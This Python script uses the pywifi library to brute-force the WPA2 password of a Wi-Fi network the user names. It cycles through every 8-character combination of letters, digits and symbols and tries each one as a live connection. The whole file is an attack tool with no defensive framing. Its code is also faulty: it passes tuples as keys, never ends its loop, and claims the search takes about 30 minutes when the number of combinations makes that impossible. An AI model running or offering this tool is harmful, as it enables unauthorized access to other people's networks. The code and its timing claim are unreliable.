import pywifi
import time
from pywifi import const
import itertools

wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]
iface.scan()

def connect_wifi(name, password):
    iface.disconnect()
    time.sleep(0.5)
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()

        profile.ssid = name
        profile.key = password
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.auth = const.AUTH_ALG_OPEN
        profile.cipher = const.CIPHER_TYPE_CCMP

        iface.remove_all_network_profiles()
        tep = iface.add_network_profile(profile)
        iface.connect(tep)

        time.sleep(0.2)

        if iface.status() == const.IFACE_CONNECTED:
            return password
        else:
            return None

letters = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-`~;:'\"\\/?.>,<[]{}|=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
found = False
i = 1
wifi_name = input("Please type the name of the wifi: ")
print("Please wait.......this may take upto 30 (or more) minutes!!")
start = time.time()

while not found:
    pass_iter = itertools.product(letters, repeat=8)
    for password in pass_iter:
        validation = connect_wifi(wifi_name, password)
        if validation is not None:
            end = time.time()
            print(f"Password for {wifi_name} found in {end - start} seconds: {validation}")

    i += 1
